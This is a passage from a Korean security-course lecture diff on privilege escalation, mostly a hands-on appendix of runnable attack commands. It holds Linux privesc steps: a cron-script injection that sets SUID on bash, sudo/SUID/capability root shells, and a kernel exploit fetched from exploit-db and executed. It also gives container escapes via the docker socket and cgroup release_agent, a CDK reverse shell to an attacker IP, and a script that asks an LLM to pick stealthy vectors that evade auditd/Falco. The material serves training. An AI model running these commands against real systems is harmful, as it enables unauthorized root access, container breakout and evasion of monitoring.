+    style SCENE fill:#ffe6cc
+    style DETECT fill:#cce6ff
+```
+
+### Case 1: dataset 정량 지표
+
+| 항목 | 값 |
+|---|---|
+| 핵심 신호 | Token + UAC bypass |
+| 정량 baseline | 4672 + 4673 |
+| 학습 매핑 | Windows privesc 자동화 |
+
+**자세한 해석**: Windows privesc 자동화. 이 차이를 정량으로 측정해야 *공격 시도와 정상 운영의 구분* 이 가능. 학생이 baseline 숫자를 외워두면 — 운영 환경에서 anomaly 를 즉시 탐지할 수 있다.
+
+### Case 2: 실전 적용 시나리오
+
+| 단계 | dataset 활용 |
+|---|---|
+| 시도 식별 | Token + UAC bypass 의 spike |
+| 정상 vs 이상 | baseline 대비 비율 |
+| 룰 작성 | Suricata / Wazuh / Sigma |
+| 검증 | dataset 재실행 |
+
+**자세한 해석**: 운영 환경 룰 작성은 — *baseline 측정 → 임계 결정 → 룰 작성 → dataset 검증* 의 4 단계. 한 단계라도 빠지면 false positive 폭증.
+
+### 이 사례에서 학생이 배워야 할 3가지
+
+1. **Windows Privesc 심화 = Token + UAC bypass 의 anomaly** — 정량 신호로 탐지.
+2. **baseline 숫자 외우기** — 4672 + 4673.
+3. **4 단계 룰 작성** — 측정 → 임계 → 룰 → 검증.
+
+**학생 액션**: winpeas 적용.
+
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course13 — Week 06 권한상승 체인)
+
+### lab step → 도구 매핑
+
+| step | 학습 항목 | OSS 도구 |
+|------|----------|---------|
+| s1 | LinPEAS (자동 enum) | LinPEAS / lse |
+| s2 | WinPEAS (Win) | WinPEAS / Seatbelt |
+| s3 | linux-exploit-suggester | les |
+| s4 | pspy (실시간 cron) | pspy64 |
+| s5 | GTFOBins 매핑 | gtfobins-cli |
+| s6 | Capability 분석 | getcap + 자체 분석 |
+| s7 | Container escape | deepce / amicontained |
+| s8 | Auto privesc chain | linpeas + les + 자체 stitcher |
+
+### 학생 환경 준비
+
+```bash
+# === LinPEAS / WinPEAS (PEASS-ng) ===
+mkdir -p ~/peass && cd ~/peass
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
+chmod +x linpeas.sh
+
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.exe -o winPEAS.exe
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat -o winPEAS.bat
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe -o winPEASany.exe
+
+# === lse (Linux Smart Enum) ===
+git clone https://github.com/diego-treitos/linux-smart-enumeration ~/lse
+
+# === linux-exploit-suggester ===
+git clone https://github.com/mzet-/linux-exploit-suggester ~/les
+ln -sf ~/les/linux-exploit-suggester.sh ~/.local/bin/les
+
+# === pspy (cron 실시간) ===
+mkdir -p ~/.local/bin
+curl -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o ~/.local/bin/pspy64
+chmod +x ~/.local/bin/pspy64
+
+# === GTFOBins CLI ===
+pip install gtfobins                                       # gtfobins lookup CLI
+
+# === deepce / amicontained (container escape) ===
+curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o /tmp/deepce.sh
+chmod +x /tmp/deepce.sh
+
+go install github.com/genuinetools/amicontained@latest
+
+# === CDK (container privesc) ===
+git clone https://github.com/cdk-team/CDK ~/cdk
+```
+
+### Linux Privesc Chain (정공 8 단계)
+
+```bash
+# === Step 1: 자동 enum (LinPEAS — 가장 종합) ===
+~/peass/linpeas.sh -a -j > /tmp/linpeas-result.json
+
+# 또는 짧게 (interesting 만)
+~/peass/linpeas.sh -a 2>&1 | grep -E '\[\!\]|\[\+\]'
+
+# 카테고리:
+# - System info
+# - Files with capabilities
+# - SUID/SGID
+# - Sudo (sudo -l)
+# - Cron jobs
+# - Software (curl, nc 등)
+# - Sensitive files
+# - User information
+# - Software vulnerabilities
+
+# === Step 2: linux-exploit-suggester (커널 매칭) ===
+~/les/linux-exploit-suggester.sh --uname --gcc
+
+# 출력:
+# [+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
+# [+] Exposure: highly probable
+# [+] Tags: ubuntu=22.04, kernel=5.15
+# [+] Download URL: https://www.exploit-db.com/exploits/50979
+
+# 또는 specific kernel
+~/les/linux-exploit-suggester.sh --kernel 5.15.0-83
+
+# === Step 3: pspy (cron 실시간 모니터) ===
+pspy64 -p -f &
+# 5분 정도 모니터링
+# 출력 예 (root cron 발견):
+# 2026-05-02 10:05:01 CMD: UID=0    PID=12345 /usr/bin/python3 /opt/secret.py
+# → root 가 5분마다 실행 → /opt/secret.py 점검
+
+ls -la /opt/secret.py                                      # 권한 확인
+# -rwxrwxrwx (world-writable!)
+
+# 악용:
+echo 'import os; os.system("chmod +s /bin/bash")' >> /opt/secret.py
+# 5분 대기 → /bin/bash 가 SUID
+/bin/bash -p
+# # whoami → root!
+
+# === Step 4: Sudo + GTFOBins ===
+sudo -l
+# (root) NOPASSWD: /usr/bin/find
+
+# GTFOBins 매칭
+gtfobins find sudo
+# 출력: sudo find . -exec /bin/sh \; -quit
+
+sudo find . -exec /bin/sh \; -quit
+# # whoami → root
+
+# === Step 5: SUID + GTFOBins ===
+find / -perm -4000 -type f 2>/dev/null
+
+# 비정상 SUID 발견 (예: vim)
+gtfobins vim suid
+# vim -c ':!/bin/sh -p'
+
+vim -c ':!/bin/sh -p'
+
+# === Step 6: Capabilities ===
+getcap -r / 2>/dev/null
+# /usr/bin/python3.10 = cap_setuid+ep
+
+# 악용
+python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+# # whoami → root
+
+# === Step 7: Writable PATH/file ===
+find / -writable -type f 2>/dev/null | head
+
+# /etc/cron.d/* 가 writable → 자체 cron 추가
+echo "* * * * * root /bin/bash -c 'chmod +s /bin/bash'" | sudo tee /etc/cron.d/own
+# 1분 대기
+
+# === Step 8: 커널 exploit (마지막 수단) ===
+# CVE-2022-32250 (nft_object UAF) 컴파일 + 실행
+wget https://www.exploit-db.com/raw/50979 -O /tmp/exploit.c
+gcc -o /tmp/exploit /tmp/exploit.c
+chmod +x /tmp/exploit
+/tmp/exploit
+# # whoami → root
+```
+
+### Windows Privesc (WinPEAS)
+
+```cmd
+:: WinPEAS (cmd 또는 PowerShell)
+winPEAS.exe
+
+:: 또는 PowerShell
+powershell -ep bypass -c ".\winPEAS.exe"
+
+:: 카테고리:
+:: - System info
+:: - Domain info
+:: - Users (인터링 사용자, 관리자)
+:: - Process (suspicious processes)
+:: - Services (modifiable, unquoted path)
+:: - AlwaysInstallElevated
+:: - Stored credentials
+:: - Scheduled tasks
+:: - Hot-keys (키 후킹)
+```
+
+### Container Escape (deepce)
+
+```bash
+# === 1. Container 환경 확인 ===
+[ -f /.dockerenv ] && echo "In container"
+mount | grep -E "docker|cgroup|overlay"
+
+cat /proc/1/cgroup                                         # /docker/... 보이면 컨테이너
+
+# === 2. deepce (자동 점검) ===
+bash /tmp/deepce.sh
+
+# 검사 항목:
+# - Privileged container?
+# - Mounted host dirs?
+# - Sock mount (/var/run/docker.sock)?
+# - Capabilities (SYS_ADMIN, SYS_PTRACE)?
+# - Notify_on_release 악용?
+# - core_pattern 악용?
+# - Old runc CVE (CVE-2019-5736)?
+
+# === 3. amicontained ===
+amicontained
+# 출력:
+# Container Runtime: docker
+# Has Namespaces: pid: true, user: false ← user namespace 없음 (위험)
+# AppArmor Profile: docker-default
+# Capabilities: ...
+# Seccomp: enabled
+
+# === 4. Docker socket abuse (sock 이 mount 된 경우) ===
+ls -la /var/run/docker.sock
+# 만약 -rw-rw---- root docker 이고 우리가 docker group 이면:
+docker run -it --rm -v /:/host alpine chroot /host bash
+# → host 의 root!
+
+# === 5. Privileged container ===
+[ -w /sys/fs/cgroup/cgroup.subtree_control ] && echo "Privileged!"
+
+# Privileged 면 host root 가능:
+mkdir -p /tmp/cgrp
+mount -t cgroup -o rdma cgroup /tmp/cgrp
+mkdir -p /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+# host 의 release_agent script 실행
+
+# === 6. CDK (container privesc 통합 toolkit) ===
+~/cdk/bin/cdk evaluate                                     # 모든 vector 자동
+~/cdk/bin/cdk run shim-pwn reverse 10.20.30.202 4444   # 6v6-attacker 의 내부 IP
+```
+
+### 통합 자동 privesc chain (자체 stitcher)
+
+```bash
+#!/bin/bash
+# /opt/scripts/auto-privesc.sh
+# Linux 자동 privesc chain
+
+DIR=/tmp/privesc-$(date +%Y%m%d-%H%M)
+mkdir -p $DIR
+
+# === Step 1: LinPEAS (5분) ===
+~/peass/linpeas.sh -a -j > $DIR/01-linpeas.json &
+LP_PID=$!
+
+# === Step 2: pspy 백그라운드 (5분) ===
+pspy64 -p -f > $DIR/02-pspy.log &
+PSPY_PID=$!
+
+# === Step 3: linux-exploit-suggester ===
+~/les/linux-exploit-suggester.sh --uname --gcc > $DIR/03-les.txt
+
+# === Step 4: GTFOBins 매핑 ===
+sudo -l 2>/dev/null > $DIR/04-sudo.txt
+
+while read line; do
+    binary=$(echo $line | grep -oE '/usr/bin/[a-zA-Z0-9_-]+' | head -1)
+    if [ -n "$binary" ]; then
+        gtfobins $(basename $binary) sudo 2>/dev/null
+    fi
+done < $DIR/04-sudo.txt > $DIR/05-gtfobins.txt
+
+# === Step 5: SUID + GTFOBins ===
+find / -perm -4000 -type f 2>/dev/null > $DIR/06-suid.txt
+while read suid; do
+    binary=$(basename $suid)
+    gtfobins $binary suid 2>/dev/null
+done < $DIR/06-suid.txt > $DIR/07-suid-gtfobins.txt
+
+# === Step 6: Capability ===
+getcap -r / 2>/dev/null > $DIR/08-capabilities.txt
+
+# === Step 7: Container check ===
+if [ -f /.dockerenv ]; then
+    bash /tmp/deepce.sh > $DIR/09-deepce.txt
+    amicontained > $DIR/10-amicontained.txt
+fi
+
+# === Step 8: 결과 자동 분석 (LLM 으로) ===
+# 모든 파일 → LLM → 우선순위 추천
+python3 << PEOF > $DIR/00-recommendations.md
+from langchain_ollama import OllamaLLM
+import json, glob
+
+llm = OllamaLLM(model="gemma3:4b")
+
+# 모든 enum 결과 합산
+all_data = ""
+for f in glob.glob("$DIR/*.txt") + glob.glob("$DIR/*.json"):
+    with open(f) as file:
+        all_data += f"\n=== {f} ===\n{file.read()[:2000]}\n"
+
+prompt = f"""다음은 Linux privesc enumeration 결과입니다:
+{all_data[:10000]}
+
+분석 결과 작성 (markdown):
+1. **즉시 시도할 vector** (top 3)
+2. **백업 plan** (다른 방법)
+3. **Stealth 고려** (auditd/Falco 가 탐지할 vector)
+4. **명령** (각 vector 의 정확한 명령)
+"""
+
+print(llm.invoke(prompt))
+PEOF
+
+echo "=== Privesc 분석 완료 — $DIR/00-recommendations.md ==="
+```
+
+### Privesc 권장 순서 (실무)
+
+```
+1. LinPEAS (5분) — 자동 종합 enum
+   ↓
+2. pspy 백그라운드 (5분 이상) — cron 발견
+   ↓
+3. Sudo + GTFOBins (가장 빠름)
+   ↓
+4. SUID + GTFOBins (가장 흔함)
+   ↓
+5. Capability (최근 자주)
+   ↓
+6. Writable cron / PATH (가끔)
+   ↓
+7. 커널 exploit (마지막 수단 — 실패 시 panic 위험)
+   ↓
+8. Container escape (있는 경우만)
+```
+
+학생은 본 6주차에서 **LinPEAS + WinPEAS + lse + linux-exploit-suggester + pspy + GTFOBins + deepce + amicontained + CDK** 9 도구로 Linux/Win/Container privesc 의 advanced chain (자동 enum → 매칭 → 단계적 시도) 을 OSS 만으로 익힌다.
